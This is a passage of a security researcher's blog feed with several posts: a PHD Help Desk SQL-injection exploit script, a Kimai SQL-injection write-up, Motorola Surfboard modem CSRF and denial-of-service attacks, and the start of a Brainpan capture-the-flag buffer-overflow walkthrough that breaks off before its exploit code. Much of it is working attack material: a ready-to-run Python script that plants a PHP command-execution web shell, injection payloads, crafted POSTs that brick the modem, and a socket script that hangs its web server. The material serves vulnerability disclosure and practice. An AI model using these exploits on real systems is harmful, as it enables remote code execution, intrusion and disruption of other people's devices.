<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># &lt;? php system($_GET["rr"]); ?&gt;
</span><span class='line'>data = urllib.urlencode({'operador':('\' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e'
</span><span class='line'>                                     ',2,3,4,5,6,7,8,9,10,11,12,13,14 INTO OUTFILE'
</span><span class='line'>                                     ' \'{0}/{1}.php'.format(options.path,shell)),
</span><span class='line'>                         'contrasenia':'pass',
</span><span class='line'>                         'submit':'Enter',
</span><span class='line'>                         'captcha':''})</span></code></pre></td></tr></table></div></figure>


<p>There&rsquo;s another SQLi vulnerability in <code>abro_adjunto.php</code>, which requires authentication to the application:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>if (isSet($_GET['file']))
</span><span class='line'>
</span><span class='line'>    {$query="SELECT *
</span><span class='line'>             FROM {$MyPHD}sigo_ticket
</span><span class='line'>             WHERE seq_sigo_ticket_id={$_GET['file']} ";
</span><span class='line'>             
</span><span class='line'>     $result=mysql_query($query) or die (mysql_error());
</span><span class='line'>     
</span><span class='line'>     $row = mysql_fetch_array($result);
</span><span class='line'>
</span><span class='line'>     $tipo_adjunto = $row['tipo_adjunto'];
</span><span class='line'>     $adjunto = $row['adjunto'];
</span><span class='line'>     $nombre_adjunto = $row['nombre_adjunto'];
</span><span class='line'>
</span><span class='line'>     if(strlen($nombre_adjunto)&gt;1)
</span><span class='line'>        {header("Content-type: $tipo_adjunto");
</span><span class='line'>         header("Content-Disposition: attachment; filename=\"$nombre_adjunto\"");
</span><span class='line'>         echo $adjunto;
</span><span class='line'>        }
</span><span class='line'>     else
</span><span class='line'>        {require('head.inc');
</span><span class='line'>         echo "&lt;div class='error'&gt;INVALID CALL &lt;/div&gt;";
</span><span class='line'>        }
</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>


<p>And the sanitization for this (and most files, really) is as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>if (get_magic_quotes_gpc())
</span><span class='line'>    { foreach($_GET as $clave =&gt; $valor)
</span><span class='line'>      {$_GET[$clave]=stripslashes($_GET[$clave]);
</span><span class='line'>      }
</span><span class='line'>    }
</span><span class='line'>
</span><span class='line'>foreach($_GET as $clave =&gt; $valor)
</span><span class='line'>     {$_GET[$clave]=trim(htmlentities($_GET[$clave],ENT_QUOTES));
</span><span class='line'>     }</span></code></pre></td></tr></table></div></figure>


<p><a href="http://php.net/manual/en/function.htmlentities.php">htmlentities</a>, when specified with the ENT_QUOTES flag, will convert both single and double quotes into HTML entities, and will thus not be injectable.  However, the above query doesn&rsquo;t even use quotes, thus there is nothing to escape.</p>

<p>There&rsquo;s stored XSS within all Attributes (Contact, Process, State, Type) that&rsquo;s loaded when viewing users:</p>

<p><img class="center" src="http://3.bp.blogspot.com/-AswfkyCHhRo/UaBswveQO1I/AAAAAAAAAfo/vBJREQ-qHjE/s640/phd_xss.jpg"></p>

<p>Here&rsquo;s the code for dropping a web shell; enjoy:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Exploit Title: PHD Help Desk 2.12 SQLi
</span><span class='line'># Date: 05/24/2013
</span><span class='line'># Exploit Author: drone (@dronesec)
</span><span class='line'># Vendor Homepage: http://www.p-hd.com.ar/
</span><span class='line'># Software Link: http://downloads.sourceforge.net/project/phd/phd_released/phd%202.12/phd_2_12.zip
</span><span class='line'># Version: 2.12
</span><span class='line'># Tested on: Ubuntu 12.04 (apparmor disabled)
</span><span class='line'>
</span><span class='line'>""" This app is so full of SQLi & XSS; if you're looking for
</span><span class='line'>    practice with real web apps, this is a good place to go.
</span><span class='line'>
</span><span class='line'>    You don't need auth for this.
</span><span class='line'>    @dronesec
</span><span class='line'>"""
</span><span class='line'>from argparse import ArgumentParser
</span><span class='line'>import string
</span><span class='line'>import random
</span><span class='line'>import urllib, urllib2
</span><span class='line'>import sys
</span><span class='line'>
</span><span class='line'>def run(options):
</span><span class='line'>    print '[!] Dropping web shell on %s...'%(options.ip)
</span><span class='line'>
</span><span class='line'>    shell = ''.join(random.choice(string.ascii_lowercase+string.digits) for x in range(5))
</span><span class='line'>
</span><span class='line'>    # &lt;? php system($_GET["rr"]); ?&gt;
</span><span class='line'>    data = urllib.urlencode({'operador':('\' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e'
</span><span class='line'>                                    ',null,null,null,null,null,null,null,null,null,null,null,null,null INTO OUTFILE'
</span><span class='line'>                                        ' \'{0}/{1}.php'.format(options.path,shell)),
</span><span class='line'>                             'contrasenia':'pass',
</span><span class='line'>                             'submit':'Enter',
</span><span class='line'>                             'captcha':''})
</span><span class='line'>
</span><span class='line'>    urllib2.urlopen('http://{0}{1}/login.php'.format(options.ip, options.rootp), data)
</span><span class='line'>    print '[!] Shell dropped.  http://%s%s/%s.php?rr=ls'%(options.ip,options.rootp,shell)
</span><span class='line'>
</span><span class='line'>def parse():
</span><span class='line'>    parser = ArgumentParser()
</span><span class='line'>    parser.add_argument('-i',help='server address',action='store',dest='ip')
</span><span class='line'>    parser.add_argument('-p',help='path to login.php (/phd_2_12)',action='store',
</span><span class='line'>                default='/phd_2_12', dest='rootp')
</span><span class='line'>    parser.add_argument('-w',help='writable web path (/var/www/phd_2_12) for shell',
</span><span class='line'>                default='/var/www/phd_2_12/', action='store', dest='path')
</span><span class='line'>
</span><span class='line'>    options = parser.parse_args()
</span><span class='line'>    if not options.ip:
</span><span class='line'>        parser.print_help()
</span><span class='line'>        sys.exit(1)
</span><span class='line'>
</span><span class='line'>    options.path = options.path if options.path[-1] != '/' else options.path[:-1]
</span><span class='line'>    options.rootp = options.rootp if options.path[-1] != '/' else options.path[:-1]
</span><span class='line'>    return options
</span><span class='line'>
</span><span class='line'>if __name__=="__main__":
</span><span class='line'>    run(parse())</span></code></pre></td></tr></table></div></figure>


<p><a href="http://www.exploit-db.com/exploits/25915/">Exploit</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kimai v0.9.2 - SQLi]]></title>
    <link href="http://hatRiot.github.io/blog/2013/05/21/kimai-v0.9.2-sqli/"/>
    <updated>2013-05-21T00:01:44-06:00</updated>
    <id>http://hatRiot.github.io/blog/2013/05/21/kimai-v0.9.2-sqli</id>
    <content type="html"><![CDATA[<p>Kimai is a time tracking solution built on the typical LAMP stack.  Multiple vulnerabilities were discovered that could allow remote code execution on the remote server.  These appear to be fixed in their source repository (<a href="https://github.com/kimai/kimai">here</a>), but none of the distribution packages (<a href="https://downloads.sourceforge.net/project/kimai/0.9.x/kimai.0.9.2.1306-3.zip">v0.9.2.1306-3</a>) have the patched version.</p>

<p>On installation, a default administrative account is generated with the following credentials: admin:changeme.  The /install/ folder is not automatically deleted, but instead a pop-up is shown each time the administrator logs in, alerting them that they should delete this folder in order to protect their system from malicious modifications.  If this folder is not deleted, it could allow unauthenticated users the ability to wipe the remote system&rsquo;s install of Kimai.</p>

<p>There are multiple directory indexes (<code>/kimai/libraries/</code>) that disclose paths, version information, and files, as well as path disclosure (<code>/kimai/error.php?err=db</code>):</p>

<p><img class="center" src="http://1.bp.blogspot.com/-FQ9oSQqSVEs/UZp1oyYlMkI/AAAAAAAAAeY/c8JuSaxjRW0/s640/kimai_path.jpg"></p>

<p>The file <code>/kimai/db_restore.php</code> is an experimental page that can be used to restore, delete, and create backups of the Kimai system.  This page can be accessed without authentication or authorization, and no audit log is generated.  This page is vulnerable to SQLi when restoring a generated backup.</p>

<p>Once a backup is created, the recovery POST appears as such:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>POST /kimai/db_restore.php HTTP/1.1
</span><span class='line'>Host: 192.168.1.219
</span><span class='line'>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0
</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
</span><span class='line'>Accept-Language: en-US,en;q=0.5
</span><span class='line'>Accept-Encoding: gzip, deflate
</span><span class='line'>DNT: 1
</span><span class='line'>Referer: http://192.168.1.219/kimai/db_restore.php
</span><span class='line'>Connection: keep-alive
</span><span class='line'>Content-Type: application/x-www-form-urlencoded
</span><span class='line'>Content-Length: 37
</span><span class='line'>
</span><span class='line'>dates%5B%5D=1369028276&submit=recover</span></code></pre></td></tr></table></div></figure>


<p>The initial request is pulled in from the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>if (isset($_REQUEST['submit'])) 
</span><span class='line'>{
</span><span class='line'>    if (($_REQUEST['submit'] == $kga['lang']['backup'][2]) && (isset($_REQUEST['dates']))) 
</span><span class='line'>    {
</span><span class='line'>        $dates = $_REQUEST['dates'];</span></code></pre></td></tr></table></div></figure>


<p>The tables are then queried, and the following code is executed:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>  // Bis rev 733 gab es in tabelle ldr keinen Primary Key ...
</span><span class='line'>        $query = "SELECT value FROM kimai_bak_" . $dates[0] . "_kimai_var WHERE var = 'revision' LIMIT 0,1;";
</span><span class='line'>   
</span><span class='line'>        if ($kga['server_conn'] == "pdo") {
</span><span class='line'>                if (is_object($pdo_conn)) {
</span><span class='line'>                    $pdo_query = $pdo_conn-&gt;prepare($query);
</span><span class='line'>                    $success = $pdo_query-&gt;execute(array());
</span><span class='line'>                $revision = $pdo_query-&gt;fetch(PDO::FETCH_ASSOC);
</span><span class='line'>                }
</span><span class='line'>        } else {
</span><span class='line'>            if (is_object($conn)) {
</span><span class='line'>                $success = $conn-&gt;Query($query);
</span><span class='line'>            $revision = $conn-&gt;RowArray(0,MYSQL_ASSOC);
</span><span class='line'>            }
</span><span class='line'>        }</span></code></pre></td></tr></table></div></figure>


<p>The <code>dates</code> parameter is used within the query without sanitization, leading to a classic SQL injection vulnerability.  This is quite serious as the page is accessible without needing to be authenticated or authorized to the Kimai system.</p>

<p>We can exploit this by generating a new backup, and running a typical SQLi, where the POST data appears as such:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dates%5B%5D=1369028276_kimai_var%20UNION%20SELECT%20INTO%20OUTFILE%20'hacked';--%20&submit=recover</span></code></pre></td></tr></table></div></figure>


<p>This will dump all output from the query into the file &lsquo;hacked&rsquo; on the remote server.  Using this, we can dump one column from any table in the database.</p>

<p>Passwords are stored using the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$passCrypt = md5($kga['password_salt'].$password.$kga['password_salt']);</span></code></pre></td></tr></table></div></figure>


<p>This is quite weak, as the salt is static for each user and can be pulled from the include/autoconf.php file.</p>

<p>Session&rsquo;s do not enforce any form of source verification, and thusly can be hijacked.</p>

<p>Here&rsquo;s a run from the script:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# python kimai_sqli.py -i 192.168.1.83 -w
</span><span class='line'>[!] Using backup id 1369074792
</span><span class='line'>[!] Shell dropped.  Go hit http://192.168.1.83/kimai/41e93.php?rr=ls
</span><span class='line'>root@kali:~# </span></code></pre></td></tr></table></div></figure>


<p><img class="src" src="http://3.bp.blogspot.com/-N4SxE1sJCMI/UZpyu-ABNWI/AAAAAAAAAeM/mJREYhveVCs/s640/kimai_run.jpg"></p>

<p><a href="http://www.exploit-db.com/exploits/25606/">Exploit</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Motorola Surfboard - Multiple Vulnerabilities]]></title>
    <link href="http://hatRiot.github.io/blog/2013/04/21/motorola-surfboard-multiple-vulnerabilities/"/>
    <updated>2013-04-21T00:06:45-06:00</updated>
    <id>http://hatRiot.github.io/blog/2013/04/21/motorola-surfboard-multiple-vulnerabilities</id>
    <content type="html"><![CDATA[<p>It would appear that these vulnerabilities were disclosed a few years ago (<a href="http://www.cvedetails.com/cve/CVE-2008-2002/">CVE-2008-2002</a> and <a href="http://www.cvedetails.com/cve/CVE-2006-5196/">CVE-2006-5196</a>), but my relatively new (1-2 years) Motorola Surfboard SB5101U (verified against both the 101 and 101U), loaded with SB5101NU-2.1.7.0-GA-00-388-NOSH, appears to be vulnerable to the same CSRF&rsquo;s exposed prior.  With no authentication system in place at all, it would appear that a local DoS is not much of a concern to them.  It&rsquo;s interesting that, despite the sudden flood of discovered vulnerabilities in routers, nobody is really taking a look at the other piece of hardware between you and the ISP.  As I poked about this modem, I discovered a few other interesting things.</p>

<p>First, here&rsquo;s the POST to reset the modem to factory defaults:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>POST /goform/RgConfig HTTP/1.1
</span><span class='line'>Host: 192.168.100.1
</span><span class='line'>Proxy-Connection: keep-alive
</span><span class='line'>Content-Length: 34
</span><span class='line'>Cache-Control: max-age=0
</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
</span><span class='line'>Origin: http://192.168.100.1
</span><span class='line'>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22
</span><span class='line'>Content-Type: application/x-www-form-urlencoded
</span><span class='line'>Referer: http://192.168.100.1/RgConfig.asp
</span><span class='line'>Accept-Encoding: gzip,deflate,sdch
</span><span class='line'>Accept-Language: en-US,en;q=0.8
</span><span class='line'>Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
</span><span class='line'>
</span><span class='line'>RestoreFactoryDefault=1&ResetReq=0</span></code></pre></td></tr></table></div></figure>


<p>And the POST for restarting the modem:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>POST /goform/RgConfig HTTP/1.1
</span><span class='line'>Host: 192.168.100.1
</span><span class='line'>Proxy-Connection: keep-alive
</span><span class='line'>Content-Length: 34
</span><span class='line'>Cache-Control: max-age=0
</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
</span><span class='line'>Origin: http://192.168.100.1
</span><span class='line'>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22
</span><span class='line'>Content-Type: application/x-www-form-urlencoded
</span><span class='line'>Referer: http://192.168.100.1/RgConfig.asp
</span><span class='line'>Accept-Encoding: gzip,deflate,sdch
</span><span class='line'>Accept-Language: en-US,en;q=0.8
</span><span class='line'>Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
</span><span class='line'>
</span><span class='line'>RestoreFactoryDefault=0&ResetReq=1</span></code></pre></td></tr></table></div></figure>


<p>This page also appears to allow the user the ability to modify modem settings by intercepting the response and modifying a javascript flag:</p>

<p><img class="center" src="http://3.bp.blogspot.com/-SJ6LsHU8-28/UVeuZzI105I/AAAAAAAAAcM/5T3qv2jygZI/s640/config_mod.jpg"></p>

<p>Once we flip the flag var from 1 to 0, we have write access via the web interface.  The write POST is as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>POST /goform/RgConfig HTTP/1.1
</span><span class='line'>Host: 192.168.100.1
</span><span class='line'>Proxy-Connection: keep-alive
</span><span class='line'>Content-Length: 125
</span><span class='line'>Cache-Control: max-age=0
</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
</span><span class='line'>Origin: http://192.168.100.1
</span><span class='line'>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22
</span><span class='line'>Content-Type: application/x-www-form-urlencoded
</span><span class='line'>Referer: http://192.168.100.1/RgConfig.asp
</span><span class='line'>Accept-Encoding: gzip,deflate,sdch
</span><span class='line'>Accept-Language: en-US,en;q=0.8
</span><span class='line'>Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
</span><span class='line'>
</span><span class='line'>CmFrequencyPlan=0&CmUpChannelId=1&CmDownstreamFreq=843000000&CmDhcpServer=on&saveChanges=1&RestoreFactoryDefault=0&ResetReq=0</span></code></pre></td></tr></table></div></figure>


<p>With this we can totally brick the device (that is, until someone figures all this out) by modifying the stream frequency as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>CmFrequencyPlan=0&CmUpChannelId=0&CmDownstreamFreq=-843000000&CmDhcpServer=on&saveChanges=1&RestoreFactoryDefault=0&ResetReq=0</span></code></pre></td></tr></table></div></figure>


<p>This can be fixed by simply restoring the configuration to the factory default through the web interface.  However: with an incomplete HTTP HEAD request, we can completely DoS the web server rendering any attempt to access it from the local network moot.  The code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>import socket
</span><span class='line'>
</span><span class='line'>request = 'HEAD / HTTP/1.1\r\n'\
</span><span class='line'>          'Connection: Keep-Alive\r\n'\
</span><span class='line'>          'Content-Length: 50\r\n'\
</span><span class='line'>          'Host: 192.168.100.1\r\n\r\n'
</span><span class='line'>try:
</span><span class='line'>    sock = socket.socket()
</span><span class='line'>    sock.connect(('192.168.100.1', 80))
</span><span class='line'>    sock.send(request)
</span><span class='line'>    print 'Holding the flag...'
</span><span class='line'>    data = sock.recv(1024)
</span><span class='line'>except Exception, e: print e
</span><span class='line'>except KeyboardInterrupt: sock.close()</span></code></pre></td></tr></table></div></figure>


<p>Because the web server does not have the entire request, it waits for it in another packet.  Which, of course, never arrives.  We can test this by removing the Content-Length field, which will automatically then close the socket.  Between these two vulnerabilities, the modem is essentially rendered useless until hard booted.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[solving brainpan]]></title>
    <link href="http://hatRiot.github.io/blog/2013/04/03/solving-brainpan/"/>
    <updated>2013-04-03T00:09:43-06:00</updated>
    <id>http://hatRiot.github.io/blog/2013/04/03/solving-brainpan</id>
    <content type="html"><![CDATA[<p>Brainpan is the brainchild of superkojiman over at vulnhub, and has some pretty interesting (and frustrating)  twists and turns.  This boot2root is more focused on exploitation of 0days in custom written software, with no metasploit modules or google hunting necessary.  With that, the nmap:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@127:~# nmap -sS -A -p- -T5 192.168.1.110
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.25 ( http://nmap.org ) at 2013-03-27 22:06 CDT
</span><span class='line'>Nmap scan report for brainpan (192.168.1.110)
</span><span class='line'>Host is up (0.00040s latency).
</span><span class='line'>Not shown: 65533 closed ports
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>9999/tcp  open  abyss?
</span><span class='line'>10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
</span><span class='line'>|_http-title: Site doesn't have a title (text/html).
</span><span class='line'>| ndmp-version: 
</span><span class='line'>|_  ERROR: Failed to get host information from server</span></code></pre></td></tr></table></div></figure>


<p>Port 10000 just serves up a page about various exploit statistics in web apps, but 9999 serves up a login page:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@127:~# nc 192.168.1.110 9999
</span><span class='line'>_|                            _|                                        
</span><span class='line'>_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
</span><span class='line'>_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
</span><span class='line'>_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
</span><span class='line'>_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
</span><span class='line'>                                            _|                          
</span><span class='line'>                                            _|
</span><span class='line'>
</span><span class='line'>[________________________ WELCOME TO BRAINPAN _________________________]
</span><span class='line'>                          ENTER THE PASSWORD                              
</span><span class='line'>
</span><span class='line'>                          &gt;&gt; whoareyou
</span><span class='line'>                          ACCESS DENIED
</span><span class='line'>root@127:~# </span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s it.  I tried a few basic injections and default passwords to no avail.  I fired up DirBuster to see what I could find, and very quickly I stumped onto <code>/bin/</code>, which contained a single file, <code>brainpan.exe</code>.  I loaded this up into a debugger to see what was inside:</p>

<p><img class="center" src="http://4.bp.blogspot.com/-XGWNxG1FbCY/UVPCvoJc0LI/AAAAAAAAAbc/J-HSrap9_jw/s640/brainpan.jpg"></p>

<p>It appeared that our password was <code>shitstorm</code>, following a strcpy of the incoming buffer.  I fired up the .exe in a VM to see what it did:</p>

<p><img class="center" src="http://4.bp.blogspot.com/-YnR2vlwbgIs/UVPDmWYEZWI/AAAAAAAAAbk/ZOLdSGpMovg/s640/brainpan_loaded.jpg"></p>

<p>Looks like this is just a copy of the program that is running in the virtual machine, and according to my registers, vulnerable:</p>

<p><img class="center" src="http://3.bp.blogspot.com/-uR5L_LXkS8o/UVPEtg3qFXI/AAAAAAAAAbs/zgjG9FTKst0/s640/brainpan_asploded.jpg"></p>

<p>So it appears we need to attach to the login form and see if we can get it to explode with shell execution.  I find it interesting that we were given a copy of the file as a exe instead of an ELF, considering what the host is running.</p>

<p>Exploiting this particular binary was not hard, but I ran into an issue that made it more difficult than it should&rsquo;ve been.  This is a very straightforward stack-based buffer overflow, but continually my stack would get corrupted and shift by one or two bytes:</p>

<p><img class="center" src="http://2.bp.blogspot.com/-c19Y3eKE7cE/UVWx2YwTsrI/AAAAAAAAAb8/Rg-_YzDb8n4/s640/wat.jpg"></p>

<p>To mitigate this, instead of my payload looking like this: <code>[524 bytes of junk | JMP ESP | NOPs | shellcode]</code></p>

<p>I had to jump a little further back to take advantage of some extra instructions: <code>[520 bytes of junk | 4 NOP bytes | PUSH EBP; MOV EBP,ESP JMP ESP | NOPs | shellcode]</code></p>

<p>This aligned my stack properly and allowed me to run a reverse shell.  Here&rsquo;s the exploit:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
